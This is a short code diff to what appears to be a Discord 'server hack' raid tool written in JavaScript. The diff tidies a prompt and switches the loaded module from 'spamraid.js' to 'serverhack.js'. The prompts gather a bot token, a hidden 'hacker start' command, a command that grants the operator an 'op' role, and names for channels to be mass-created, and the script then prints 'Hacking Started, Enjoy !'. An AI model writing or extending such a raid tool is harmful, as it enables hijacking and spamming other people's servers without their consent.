@@ -133,7 +133,7 @@ if(option === "4") {
    print("Another Note: TOKEN must be written when the tool asks for the token and not in the token.json file against the another commands")
 var ownid = input.question("Now Please Type Your ID:")
 var cmd = input.question("Now Type The Hacker Start Command:")
-var oprole = input.question("Now Please Type The Oprole Name Will Create And Gives You After You Type The op")
+var oprole = input.question("Now Please Type The Oprole Name Will Create And Gives You After You Type The op:")
 var opcmd = input.question("Now Please Type a command that, when written, gives you the op role:")
 var textch = input.question("Now Please Type The Name Of Text Channels Will Be Create When You Type The Command :")
 var voicech = input.question("Now Please Type The Name Of Voice Channels Will Be Create When You Type The Command:")
@@ -160,7 +160,7 @@ urid: ownid
 }
 save()
 print("Hacking ! ! ..")
- var spamchannel = require("./tools/spamraid.js")
+ var spamchannel = require("./tools/serverhack.js")
 print("Hacking Started, Enjoy !")
 
 }
